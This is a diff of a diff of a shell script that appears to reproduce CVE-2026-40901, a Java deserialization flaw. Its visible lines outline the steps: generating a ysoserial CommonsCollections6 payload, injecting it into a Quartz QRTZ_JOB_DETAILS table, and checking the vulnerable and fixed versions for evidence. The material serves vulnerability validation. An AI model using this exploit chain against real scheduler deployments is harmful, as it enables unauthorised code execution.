@@ -1,11 +1,9 @@
 --- repro/reproduction_steps.sh
 +++ repro/reproduction_steps.sh
-@@ -9,13 +9,61 @@
+@@ -9,13 +9,59 @@
 
  cd "$ROOT"
 
-+export DOCKER_API_VERSION="${DOCKER_API_VERSION:-1.43}"
-+
 +SUDO=""
 +if [ "$(id -u)" -ne 0 ] && command -v sudo >/dev/null 2>&1; then
 +    SUDO="sudo"
@@ -65,7 +63,7 @@
 
  echo "============================================"
  echo "CVE-2026-40901 Reproduction"
-@@ -24,9 +72,9 @@
+@@ -24,9 +70,9 @@
  echo ""
 
  # Step 1: Ensure ysoserial is available
@@ -77,7 +75,7 @@
  fi
 
  # Step 2: Generate ysoserial CommonsCollections6 payload
-@@ -48,10 +96,10 @@
+@@ -48,10 +94,10 @@
  python3 -c "
  with open('$PAYLOAD_BIN','rb') as f:
      data = f.read()
@@ -90,7 +88,7 @@
 
  # Step 3: Compile deserialization harness (for classpath test)
  echo "[+] Compiling deserialization harness..."
-@@ -68,7 +116,7 @@
+@@ -68,7 +114,7 @@
      }
  }
  JAVAEOF
@@ -99,7 +97,7 @@
 
  # Step 4: Verify commons-collections 3.x presence/absence
  echo ""
-@@ -158,29 +206,107 @@
+@@ -158,29 +204,107 @@
  done
  
  echo "[+] Injecting payload into QRTZ_JOB_DETAILS..."
@@ -226,7 +224,7 @@
  fi
  
  echo "[+] Checking logs for Quartz deserialization evidence..."
-@@ -203,8 +329,8 @@
+@@ -203,8 +327,8 @@
  echo "========== TESTING FIXED v2.10.21 (Container Classpath) =========="
 
  rm -f "$MARKER"
@@ -237,7 +235,7 @@
  
  echo "$FIXED_OUTPUT" > "$EVIDENCE/fixed-container-test.log"
  
-@@ -245,9 +371,6 @@
+@@ -245,9 +369,6 @@
  EOF
  
  cat > "$EVIDENCE/validation_verdict.json" <<EOF
@@ -247,7 +245,7 @@
  {
    "cve": "CVE-2026-40901",
    "vulnerable_version": "v2.10.20",
-@@ -260,6 +383,9 @@
+@@ -260,6 +381,9 @@
  }
  EOF
  
